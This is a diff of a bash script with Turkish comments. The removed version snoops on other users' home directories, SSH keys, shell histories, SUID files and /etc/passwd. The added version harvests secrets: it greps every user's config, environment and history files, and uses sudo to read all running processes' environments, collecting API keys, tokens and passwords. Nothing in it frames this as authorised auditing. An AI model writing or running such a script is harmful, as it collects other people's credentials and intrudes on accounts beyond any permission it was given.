@@ -1,30 +1,33 @@
 #!/bin/bash
 
-echo "===== Checking other user directories under /home ====="
+echo "===== Searching for possible API keys and secrets in /home/* ====="
+
 for userdir in /home/*; do
-  echo "----- Listing files in $userdir -----"
-  ls -la "$userdir" 2>/dev/null
+  echo "----- Scanning $userdir -----"
 
-  echo "----- Attempting to read $userdir/.ssh/authorized_keys -----"
-  cat "$userdir/.ssh/authorized_keys" 2>/dev/null
+  # Belirli dosyalarda arama (config, env, history, json, yaml, ini vb.)
+  find "$userdir" \( -name "*.env" -o -name "*.config" -o -name "*.json" -o -name "*.yml" -o -name "*.yaml" -o -name "*.ini" -o -name "*.bash_history" -o -name "*.sh" \) 2>/dev/null | while read file; do
+    echo "Scanning file: $file"
+    
+    # API key, secret, token, password vb. gibi olabilecek patternleri grep ile ara:
+    grep -Ei 'api[_-]?key|secret|token|password|access[_-]?key|private[_-]?key|auth' "$file" 2>/dev/null | head -10
+  done
 
-  echo "----- Attempting to read $userdir/.bash_history -----"
-  cat "$userdir/.bash_history" 2>/dev/null
+  # Ayrıca environment değişkenlerinde arama (ör. .profile, .bashrc, .bash_profile)
+  for envfile in ".profile" ".bashrc" ".bash_profile" ".zshrc"; do
+    f="$userdir/$envfile"
+    if [ -f "$f" ]; then
+      echo "Scanning environment file: $f"
+      grep -Ei 'api[_-]?key|secret|token|password|access[_-]?key|private[_-]?key|auth' "$f" 2>/dev/null | head -10
+    fi
+  done
 done
 
-echo "===== Searching for SUID files ====="
-find / -perm -4000 -type f 2>/dev/null
+echo "===== Searching system-wide environment variables of running processes ====="
 
-echo "===== Checking /etc/passwd for all users ====="
-cat /etc/passwd 2>/dev/null
-
-echo "===== Checking running processes owned by other users ====="
-ps aux | awk -v user="$(whoami)" '$1 != user {print $0}' | head -20
-
-echo "===== Attempting to read other users' environment variables (proc) ====="
 for pid in $(ps -e -o pid=); do
   if [ -r "/proc/$pid/environ" ]; then
-    echo "--- /proc/$pid/environ ---"
-    sudo cat /proc/$pid/environ 2>/dev/null | tr '\0' '\n' | head -10
+    echo "--- /proc/$pid/environ for PID $pid ---"
+    sudo tr '\0' '\n' < /proc/$pid/environ | grep -Ei 'api[_-]?key|secret|token|password|access[_-]?key|private[_-]?key|auth' | head -10
   fi
 done
